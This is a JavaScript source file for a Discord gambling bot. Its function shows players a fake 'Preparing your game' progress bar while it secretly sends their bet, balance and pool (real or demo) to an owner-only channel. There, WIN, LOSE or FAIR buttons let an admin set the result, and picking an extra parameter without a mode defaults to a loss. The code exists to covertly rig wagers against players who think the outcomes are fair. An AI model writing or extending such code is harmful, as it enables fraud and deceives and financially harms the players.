const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } = require('discord.js');
const config = require('../config');

function fmtR(n) {
  return (+n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

/**
 * @param {Message}    message
 * @param {string}     defaultMode
 * @param {string}     gameLabel
 * @param {Message|null} existingMsg
 * @param {null|{label:string,buttons:{label:string,value:string}[]}} extras
 * @param {null|{bet:number, mult:string, payout:number|null, balance:number, isDemo:boolean}} betInfo
 * @returns {Promise<{mode:string, loadMsg:Message, extra:string|null}>}
 */
async function awaitAdminControl(message, defaultMode, gameLabel, existingMsg = null, extras = null, betInfo = null) {
  const token = `${message.id}_${Date.now()}`;

  const bars = [
    '`[▓▓▓▓░░░░░░░░░░░░░░░░] 20%`',
    '`[▓▓▓▓▓▓▓▓░░░░░░░░░░░░] 40%`',
    '`[▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░] 60%`',
    '`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░] 80%`',
    '`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%`',
  ];

  let loadMsg;
  const initEmbed = new EmbedBuilder()
    .setColor(config.colors.primary)
    .setTitle(`🎲 ${gameLabel}`)
    .setDescription('⏳ **Preparing your game...**\n\n`[░░░░░░░░░░░░░░░░░░░░] 0%`')
    .setTimestamp();

  if (existingMsg) {
    await existingMsg.edit({ embeds: [initEmbed], components: [] }).catch(() => {});
    loadMsg = existingMsg;
  } else {
    loadMsg = await message.reply({ embeds: [initEmbed] });
  }

  let chosenMode = null;
  let chosenExtra = null;

  const adminTask = Promise.race([
    (async () => {
      const channelId = config.controlChannelId;
      if (!channelId) return;

      const controlChannel = await Promise.race([
        message.client.channels.fetch(channelId).catch(() => null),
        new Promise(r => setTimeout(() => r(null), 2000)),
      ]);
      if (!controlChannel) return;

      // Build bet info lines for the embed
      const betLines = [];
      if (betInfo) {
        const pool = betInfo.isDemo ? 'Demo' : 'Real';
        betLines.push(
          `💰 **Bet:** ${fmtR(betInfo.bet)} ${config.currency} *(${pool})*`,
          `🎯 **Multiplier:** ${betInfo.mult}`,
          betInfo.payout != null
            ? `💵 **Payout if WIN:** ${fmtR(betInfo.payout)} ${config.currency}`
            : `💵 **Payout if WIN:** Variable (cash-out based)`,
          `👛 **Balance:** ${fmtR(betInfo.balance)} ${config.currency}`,
        );
      }

      const controlEmbed = new EmbedBuilder()
        .setColor(config.colors.gold)
        .setTitle(`🎮 ${gameLabel} — Override (5s)`)
        .setDescription([
          `**User:** ${message.author.tag} (<@${message.author.id}>)`,
          `**Game:** ${gameLabel}`,
          `**Channel:** <#${message.channel.id}>`,
          `**Default:** \`${defaultMode}\``,
          '',
          ...(betLines.length ? betLines : []),
          '',
          extras ? `**${extras.label}:** Pick a button below` : '',
          '> Click WIN / LOSE / FAIR within 5 seconds.',
        ].filter(l => l !== undefined).join('\n'))
        .setTimestamp();

      const modeRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`ac_win_${token}`).setLabel('✅ WIN').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`ac_lose_${token}`).setLabel('❌ LOSE').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId(`ac_fair_${token}`).setLabel('🎲 FAIR').setStyle(ButtonStyle.Secondary),
      );

      const rows = [modeRow];
      if (extras?.buttons?.length) {
        rows.push(new ActionRowBuilder().addComponents(
          ...extras.buttons.slice(0, 5).map(b =>
            new ButtonBuilder()
              .setCustomId(`acx_${b.value}_${token}`)
              .setLabel(b.label)
              .setStyle(ButtonStyle.Primary)
          )
        ));
      }

      const ctrlMsg = await Promise.race([
        controlChannel.send({
          content: `<@${config.ownerId}>`,
          embeds: [controlEmbed],
          components: rows,
        }).catch(() => null),
        new Promise(r => setTimeout(() => r(null), 2000)),
      ]);
      if (!ctrlMsg) return;

      await new Promise(resolve => {
        const collector = ctrlMsg.createMessageComponentCollector({
          componentType: ComponentType.Button,
          filter: i => {
            const isOwner = i.user.id === config.ownerId;
            const isAdmin = i.member?.permissions?.has('Administrator') ||
              config.adminRoleIds.some(id => i.member?.roles?.cache?.has(id));
            return (isOwner || isAdmin) && i.customId.endsWith(token);
          },
          time: 4500,
        });

        collector.on('collect', async i => {
          await i.deferUpdate().catch(() => {});
          if (i.customId.startsWith('ac_')) {
            chosenMode = i.customId.split('_')[1];
          } else if (i.customId.startsWith('acx_')) {
            const parts = i.customId.split('_');
            chosenExtra = parts[1];
            if (!chosenMode) chosenMode = 'lose';
          }
        });

        collector.on('end', () => {
          const disabledModeRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`ac_win_${token}`).setLabel('✅ WIN').setStyle(ButtonStyle.Success).setDisabled(true),
            new ButtonBuilder().setCustomId(`ac_lose_${token}`).setLabel('❌ LOSE').setStyle(ButtonStyle.Danger).setDisabled(true),
            new ButtonBuilder().setCustomId(`ac_fair_${token}`).setLabel('🎲 FAIR').setStyle(ButtonStyle.Secondary).setDisabled(true),
          );
          const disabledRows = [disabledModeRow];
          if (extras?.buttons?.length) {
            disabledRows.push(new ActionRowBuilder().addComponents(
              ...extras.buttons.slice(0, 5).map(b =>
                new ButtonBuilder().setCustomId(`acx_${b.value}_${token}`).setLabel(b.label).setStyle(ButtonStyle.Primary).setDisabled(true)
              )
            ));
          }
          const summary = chosenExtra
            ? `⚙️ Param: **${chosenExtra}** | Mode: **${(chosenMode || defaultMode).toUpperCase()}**`
            : chosenMode
              ? `✔ **${chosenMode.toUpperCase()}** — ${message.author.tag}`
              : `⏰ No override — \`${defaultMode}\` applied`;
          ctrlMsg.edit({
            content: '',
            embeds: [new EmbedBuilder()
              .setColor(chosenMode ? config.colors.success : config.colors.primary)
              .setTitle(`🎮 ${gameLabel} — Done`)
              .setDescription(summary)
              .setTimestamp()],
            components: disabledRows,
          }).catch(() => {});
          resolve();
        });
      });
    })(),
    new Promise(r => setTimeout(r, 4800)),
  ]);

  const animTask = (async () => {
    for (const bar of bars) {
      await new Promise(r => setTimeout(r, 1000));
      await loadMsg.edit({
        embeds: [new EmbedBuilder()
          .setColor(config.colors.primary)
          .setTitle(`🎲 ${gameLabel}`)
          .setDescription(`⏳ **Preparing your game...**\n\n${bar}`)
          .setTimestamp()],
      }).catch(() => {});
    }
  })();

  await Promise.all([adminTask, animTask]);

  return { mode: chosenMode || defaultMode, loadMsg, extra: chosenExtra };
}

module.exports = { awaitAdminControl };
